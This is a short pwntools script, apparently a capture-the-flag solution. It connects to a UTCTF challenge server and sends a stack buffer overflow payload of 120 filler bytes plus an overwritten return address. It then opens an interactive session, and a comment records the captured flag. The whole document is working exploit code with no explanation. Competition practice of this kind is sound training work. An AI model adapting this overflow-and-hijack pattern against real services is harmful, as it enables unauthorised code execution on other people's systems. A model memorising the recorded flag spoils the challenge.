from pwn import *

#nc pwn.utctf.live 5000

p = remote('pwn.utctf.live', 5000)

payload = b'B' * 120
payload += p64(0x0040118e)

p.sendline(payload)
p.interactive()

# Flag : utflag{you_expected_the_flag_to_be_screaming_but_it_was_me_dio98054042}
